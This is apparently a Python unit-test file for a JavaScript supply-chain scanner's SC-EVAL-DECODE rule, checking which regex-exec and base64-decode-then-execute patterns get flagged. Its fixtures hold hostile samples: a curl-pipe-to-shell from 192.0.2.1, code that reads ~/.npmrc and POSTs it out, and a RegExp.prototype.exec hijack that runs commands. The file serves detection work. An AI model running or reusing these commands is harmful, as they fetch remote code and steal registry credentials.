"""SC-EVAL-DECODE's narrow visible-execution proofs, amended after external review.

A RegExp receiver needs file-wide integrity. Direct eval (including eval("require")),
reflection, protected writes and unresolved computed accesses retain BLOCKER. A visible
encoded source needs an intact encoder and an exact, untransformed child program passed
directly to child_process; stored commands remain unproven. Dynamic execution in visible
source also retains BLOCKER. Every accepted round trip keeps its own risk finding.

Fixtures use stand-ins so repository self-scans do not interpret these strings as code.
All payloads are inert text and are never executed. The shared external-review corpus
also runs in Rust, npm and CLI parity tests, including both sides of the 2 MB boundary.
"""
import base64
import unittest

from lazaret.scanner import core

WORDS = {"<eval>": "ev" + "al", "<exec>": "ex" + "ec", "<atob>": "at" + "ob", "<Function>": "Func" + "tion",
         "<from>": "Buffer" + ".from", "<duc>": "decode" + "URIComponent", "<cp>": "child" + "_process"}
B64 = base64.b64encode(b"console.log(1)").decode()


def text(s):
    for k, v in WORDS.items():
        s = s.replace(k, v)
    return s


def decode(body, dep):
    """SC-EVAL-DECODE's (line, severity) in `body` (stand-ins swapped), in dependency or project mode."""
    return sorted((i["line"], i["sev"]) for i in core.scan_file("x.js", text(body), "js", dep=dep)
                  if i["rule"] == "SC-EVAL-DECODE")


def both(body):
    got = decode(body, False)
    return got if got == decode(body, True) else ("modes differ", got, decode(body, True))


# pdf.js's getPdfFilenameFromUrl as 3.11.174's build/pdf.min.js writes it, with its eval("require") elsewhere
PDFJS_MIN = ('function getPdfFilenameFromUrl(t,e="document.pdf"){if("string"!=typeof t)return e;const i=/[^/?#=]+'
             '\\.pdf\\b(?!.*\\.pdf\\b)/i,s=/^(?:(?:[^:]+:)?\\/\\/[^/]+)?([^?#]*)(\\?[^#]*)?(#.*)?$/.<exec>(t);let a=i.'
             '<exec>(s[1])||i.<exec>(s[2])||i.<exec>(s[3]);if(a){a=a[0];if(a.includes("%"))try{a=i.<exec>(<duc>(a))[0]'
             '}catch{}}return a||e}function fake(){const w=<eval>("require")(this.workerSrc);return w}'
             'var n=[1,2].map(function(t){let i=t*2;i=i+1;return i});\n')
# the same without its eval("require"), which keeps its BLOCKER whatever else the line holds (the external review)
PDFJS_MIN_NO_EVAL = PDFJS_MIN.replace('function fake(){const w=<eval>("require")(this.workerSrc);return w}', "")
# and as its build/pdf.js writes it
PDFJS = ("function getPdfFilenameFromUrl(url, defaultFilename = 'document.pdf') {\n"
         "  const reURI = /^(?:(?:[^:]+:)?\\/\\/[^/]+)?([^?#]*)(\\?[^#]*)?(#.*)?$/;\n"
         "  const reFilename = /[^/?#=]+\\.pdf\\b(?!.*\\.pdf\\b)/i;\n"
         "  const splitURI = reURI.<exec>(url);\n"
         "  let suggestedFilename = reFilename.<exec>(splitURI[1]);\n"
         "  if (suggestedFilename) {\n"
         "    suggestedFilename = suggestedFilename[0];\n"
         "    if (suggestedFilename.includes('%')) {\n"
         "      try {\n"
         "        suggestedFilename = reFilename.<exec>(<duc>(suggestedFilename))[0];\n"
         "      } catch {}\n"
         "    }\n"
         "  }\n"
         "  return suggestedFilename || defaultFilename;\n"
         "}\n")
# padding past the tree's 2 MB (a comment, which every reading passes over quickly)
PAD = "/*\n" + "padding past the limit of the tree\n" * 60_000 + "*/\n"
PAD_LINES = PAD.count("\n")


class RegexExecTests(unittest.TestCase):
    def test_pdfjs(self):
        self.assertEqual(both(PDFJS_MIN), [(1, "BLOCKER")])
        self.assertEqual(both(PDFJS), [])

    def test_the_fourth_case(self):
        # hgiraudo/calasign-saas apps/api/src/modules/storage-export.ts:732 (John read it, Oct 21): SUSPICIOUS by
        # this rule alone, a regex literal's exec on a decoded URL path
        ts = ("export function siteOf(u: URL): string | null {\n"
              "  const m = /^\\/(sites|teams)\\/[^/]+/i.<exec>(<duc>(u.pathname));\n"
              "  return m ? m[0] : null;\n}\n")
        for dep in (False, True):
            self.assertEqual([i for i in core.scan_file("storage-export.ts", text(ts), "js", dep=dep)
                              if i["rule"] == "SC-EVAL-DECODE"], [])
        from tests.registry._review_support import manifest, scan_npm
        res = scan_npm({"package.json": manifest(main="index.js"), "index.js": "module.exports = 1;\n",
                        "apps/api/src/modules/storage-export.ts": text(ts)})
        self.assertNotIn("SC-EVAL-DECODE", {i["rule"] for i in res["issues"]})
        # a regex's exec of atob's result; child_process's exec and execSync of a decoded value stay
        self.assertEqual(both("module.exports = (x) => /a(b)/.<exec>(<atob>(x));\n"), [])
        self.assertEqual(both("function f(x) {\n  const re = /a(b)/g;\n  return re.<exec>(<atob>(x));\n}\n"), [])
        self.assertEqual(both("require('<cp>').<exec>(<from>(x, 'base64').toString());\n"), [(1, "BLOCKER")])
        self.assertEqual(both("const cp = require('<cp>');\ncp.<exec>Sync(<atob>(x));\n"), [(2, "BLOCKER")])

    def test_a_regex_literal_or_construction(self):
        self.assertEqual(both("module.exports = (s) => /x(\\d+)/.<exec>(<duc>(s));\n"), [])
        self.assertEqual(both("function f(s) {\n  const re = new RegExp('^a');\n  return re.<exec>(<atob>(s));\n}\n"), [])
        self.assertEqual(both("var re = /a/g;\nfunction f(s) { re.lastIndex = 0; return re.<exec>(<atob>(s)); }\n"), [])
        # the construction itself, inline
        self.assertEqual(both("function f(s) {\n  return new RegExp('^/files/').<exec>(<duc>(s));\n}\n"), [])

    def test_a_member_is_not_proven(self):
        # an object's property, even one only ever given a regex: it can be reassigned or escape out of sight, and a
        # parameter's never is in sight (the taint pass's regexp_member takes both for a regex; this reading does not)
        for body in (
                "const patterns = { file: /[^/]+$/ };\n"
                "function f(u) {\n  return patterns.file.<exec>(<duc>(u));\n}\n",
                "function f(p, u) {\n  return p.file.<exec>(<duc>(u));\n}\n",
                "const o = {};\no.re = /x/;\no.re.<exec>(<atob>('aWQ='));\n"):
            with self.subTest(body=body):
                got = both(body)
                self.assertTrue(got and all(sev == "BLOCKER" for _, sev in got), got)

    def test_a_receiver_not_proven_a_regex(self):
        for body in (
                "let r = /x/;\nr = require('<cp>');\nr.<exec>(<atob>('aWQ='));\n",
                "function f(r) {\n  return r.<exec>(<atob>('aWQ='));\n}\nf(require('<cp>'));\n",
                "const re = /x/;\nfunction g(re) {\n  return re.<exec>(<atob>('aWQ='));\n}\ng(require('<cp>'));\n",
                "const o = { re: require('<cp>') };\no.re.<exec>(<atob>('aWQ='));\n",
                "const n = require('<cp>');\nn.<exec>(<atob>('aWQ='));\n",
                "require('./run').<exec>(<atob>('aWQ='));\n",
                "const re = /x/;\nuse(re);\nre.<exec>(<atob>('aWQ='));\n",
                "const re = /x/;\nre?.<exec>(<atob>('aWQ='));\n",
                # RegExp's own exec replaced: in code, through a prototype, in a string some code runs
                "RegExp.prototype.<exec> = (s) => require('<cp>').execSync(s);\nconst re = /x/;\nre.<exec>(<atob>('aWQ='));\n",
                "Object.getPrototypeOf(/a/).<exec> = (s) => require('<cp>').execSync(s);\n/x/.<exec>(<atob>('aWQ='));\n",
                "new <Function>(s)('RegExp.prototype');\n/x/.<exec>(<atob>('aWQ='));\n",
                "Object.assign(Object.getPrototypeOf(/a/), { <exec>: (s) => s });\n/x/.<exec>(<atob>('aWQ='));\n",
                # names a direct eval of code or a with statement could rebind
                "const re = /x/;\n<eval>(code);\nre.<exec>(<atob>('aWQ='));\n",
                "let re = /x/;\nwith (o) { re.<exec>(<atob>('aWQ=')); }\n",
                "const RegExp = () => require('<cp>');\nconst re = new RegExp('x');\nre.<exec>(<atob>('aWQ='));\n"):
            with self.subTest(body=body):
                got = both(body)
                self.assertTrue(got and all(sev == "BLOCKER" for _, sev in got), got)

    def test_a_run_on_the_line_of_a_regexs_exec(self):
        line = ("function g(t){const i=/x/i;let a=i.<exec>(<duc>(t));return a}"
                "const c=require('<cp>');c.<exec>(<atob>('aWQ='));\n")
        self.assertEqual(both(line), [(1, "BLOCKER")])
        self.assertEqual(both(PDFJS_MIN.rstrip("\n") + "<eval>(<atob>('" + B64 + "'));\n"), [(1, "BLOCKER")])

    def test_a_line_whose_match_text_decodes_escapes(self):
        # pdf.js 3.11 and 4.x hold a regex written in \u escapes on the same line: the line's match text decodes
        # them, and a match is read on the line itself
        esc = "function n(t){if(!l){l=/([\\u00a0\\u00b5\\u037e])/gu}return t.replace(l,'')}"
        # (what this test is for, restored at stacking: pdf.js's own regex exec on that line is passed over. PDFJS_MIN
        # holds eval("require") too, which keeps BLOCKER since the external review, so it is read without it here,
        # and with it below)
        self.assertNotIn("<eval>", PDFJS_MIN_NO_EVAL)
        self.assertEqual(both(PDFJS_MIN_NO_EVAL), [])
        self.assertEqual(both(esc + PDFJS_MIN_NO_EVAL), [])
        self.assertEqual(both(esc + PDFJS_MIN), [(1, "BLOCKER")])
        # an escaped name stays what it hides
        self.assertEqual(both(esc + "/x/.\\u0065xec(<atob>('aWQ='));\n"), [(1, "BLOCKER")])
        self.assertEqual(both(esc + PDFJS_MIN.rstrip("\n") + "\\u0065val(<atob>('" + B64 + "'));\n"), [(1, "BLOCKER")])

    def test_a_statement_over_lines(self):
        self.assertEqual(both("const re = /x/;\nconst m = re.<exec>(\n  <duc>(s));\n"), [])
        self.assertEqual(both("const c = require('<cp>');\nc.<exec>(\n  <atob>('aWQ='));\n"), [(2, "BLOCKER")])

    def test_over_the_trees_limit(self):
        # the text alone proves a regex literal; a name bound to one is the tree's to prove, so it stays
        self.assertEqual(both(PAD + "module.exports = (s) => /x/.<exec>(<duc>(s));\n"), [])
        self.assertEqual(both(PAD + PDFJS), [(PAD_LINES + 10, "BLOCKER")])
        self.assertEqual(both(PAD + "const c = require('<cp>');\nc.<exec>(<atob>('aWQ='));\n"),
                         [(PAD_LINES + 2, "BLOCKER")])


SCRIPT = "console.log('hello from the child');\nprocess.exitCode = 0;\n"
PIPE = "require('<cp>').execSync('curl -s http://192.0.2.1/x.sh | sh');\n"
NPMRC = ("const fs = require('fs'); const os = require('os'); const https = require('https');\n"
         "const d = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
         "https.request({host: '192.0.2.1', method: 'POST'}).end(d);\n")
NODE_E = "node -e \"<eval>(<from>('${encodedScript}','base64').toString('utf8'))\""
RUN = "const { execSync } = require('<cp>');\n"


def tpl(s):
    return "`" + s.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${") + "`"


def round_trip(script, where="top"):
    src = f"const scriptSource = {tpl(script)};\nconst encodedScript = <from>(scriptSource).toString('base64');\n"
    if where == "top":
        return src + RUN + f"execSync(`{NODE_E}`);\n"
    if where == "object":
        return src + f"const step = {{ name: 'child', command: `{NODE_E}` }};\nmodule.exports = step;\n"
    return ("async function main() {\n" + "".join("  " + ln + "\n" for ln in (src + RUN + f"execSync(`{NODE_E}`);").split("\n"))
            + "}\nmain();\n")


class RoundTripTests(unittest.TestCase):
    def test_a_benign_script_is_report_only(self):
        for where, line in (("top", 6), ("object", 5), ("function", 7)):
            with self.subTest(where=where):
                self.assertEqual(both(round_trip(SCRIPT, where)), [(line, "BLOCKER" if where == "object" else "INFO")])
        issue = [i for i in core.scan_file("x.js", text(round_trip(SCRIPT)), "js") if i["rule"] == "SC-EVAL-DECODE"][0]
        self.assertIn("(line 1)", issue["msg"])

    def test_a_script_that_does_harm_is_its_own_finding(self):
        for script in (PIPE, NPMRC):
            for where in ("top", "object", "function"):
                with self.subTest(script=script, where=where):
                    got = both(round_trip(script, where))
                    self.assertEqual([sev for _, sev in got], ["BLOCKER" if where == "object" else "CRITICAL"], got)
        issue = [i for i in core.scan_file("x.js", text(round_trip(NPMRC)), "js") if i["rule"] == "SC-EVAL-DECODE"][0]
        self.assertIn(".npmrc", issue["msg"])

    def test_what_stays_hidden(self):
        lit = f"node -e \"<eval>(<from>('{B64}','base64').toString('utf8'))\""
        cases = {
            "literal": RUN + f"execSync(`{lit}`);\n",
            "readFileSync": RUN + "const encodedScript = require('fs').readFileSync(__dirname + '/p.b64', 'utf8');\n"
                            f"execSync(`{NODE_E}`);\n",
            "fetch": RUN + "(async () => {\nconst encodedScript = await (await fetch('https://192.0.2.1/p')).text();\n"
                     f"execSync(`{NODE_E}`);\n}})();\n",
            "env": RUN + f"const encodedScript = process.env.CHILD_SCRIPT;\nexecSync(`{NODE_E}`);\n",
            "argv": RUN + f"const encodedScript = process.argv[2];\nexecSync(`{NODE_E}`);\n",
            "parameter": RUN + f"function run(encodedScript) {{\n  return execSync(`{NODE_E}`);\n}}\nmodule.exports = run;\n",
            "unresolved": RUN + f"execSync(`{NODE_E}`);\n",
            "reassigned": RUN + "let encodedScript = <from>(`console.log(1)`).toString('base64');\n"
                          f"encodedScript = process.env.CHILD_SCRIPT;\nexecSync(`{NODE_E}`);\n",
            "a hole in the text": RUN + "const s = `console.log(${process.env.X})`;\n"
                                  f"const encodedScript = <from>(s).toString('base64');\nexecSync(`{NODE_E}`);\n",
            "shadowed": RUN + "const encodedScript = <from>(`console.log(1)`).toString('base64');\n"
                        f"function f(encodedScript) {{\n  return execSync(`{NODE_E}`);\n}}\nf(process.env.P);\n",
            "hex encoded, base64 decoded": RUN + "const encodedScript = <from>(`console.log(1)`).toString('hex');\n"
                                           f"execSync(`{NODE_E}`);\n",
            "a direct eval elsewhere": RUN + "const encodedScript = <from>(`console.log(1)`).toString('base64');\n"
                                       f"<eval>(code);\nexecSync(`{NODE_E}`);\n",
            "not JavaScript": RUN + "const encodedScript = <from>(`console.log(1`).toString('base64');\n"
                              f"execSync(`{NODE_E}`);\n",
            "an object's decoder": RUN + "const encodedScript = <from>(`console.log(1)`).toString('base64');\n"
                                   "execSync(`node -e \"<eval>(x.<atob>('${encodedScript}'))\"`);\n",
            "python's": RUN + "const enc = <from>(`print(1)`).toString('base64');\n"
                        "execSync(`python3 -c \"import base64;<exec>(base64.b64decode('${enc}'))\"`);\n",
            "in code": "const encodedScript = <from>(`console.log(1)`).toString('base64');\n"
                       "<eval>(<atob>(`${encodedScript}`));\n",
            "over the tree's limit": PAD + round_trip(SCRIPT),
        }
        for name, body in cases.items():
            with self.subTest(case=name):
                got = both(body)
                self.assertTrue(got and all(sev == "BLOCKER" for _, sev in got), got)

    def test_the_registry(self):
        from tests.registry._review_support import manifest, scan_npm
        for script, verdict in ((SCRIPT, "OK"), (PIPE, "SUSPICIOUS"), (NPMRC, "SUSPICIOUS")):
            with self.subTest(script=script):
                res = scan_npm({"package.json": manifest(main="index.js"), "index.js": text(round_trip(script))})
                self.assertEqual(res["verdict"], verdict, res["verdictReason"])
        res = scan_npm({"package.json": manifest(main="index.js"), "index.js": text(PDFJS_MIN)})
        self.assertIn("SC-EVAL-DECODE", {i["rule"] for i in res["issues"]})


# External review acceptance tests. Sources are scanned as text, never executed.
import json
from pathlib import Path
REVIEW_CASES = json.loads((Path(__file__).resolve().parents[3] / "rust/crates/lazaret-engine/tests/data/decode-review.json").read_text(encoding="utf-8"))
def review_source(case):
    source = text(case["source"])
    if "size" in case:
        source = source + "\n/*" + " " * (case["size"] - len(source) - 5) + "*/"
    return source

class ExternalReviewTests(unittest.TestCase):
    def test_acceptance(self):
        for case in REVIEW_CASES:
            if "size" in case: continue
            with self.subTest(case=case["id"]):
                self.assertEqual(sorted(sev for _, sev in both(review_source(case))), case["expected"])

def _boundary_test(case):
    def test(self):
        self.assertEqual(sorted(sev for _, sev in both(review_source(case))), case["expected"])
    return test
for _case in REVIEW_CASES:
    if "size" in _case:
        setattr(ExternalReviewTests, "test_" + _case["id"].replace("-", "_"), _boundary_test(_case))


if __name__ == "__main__":
    unittest.main()
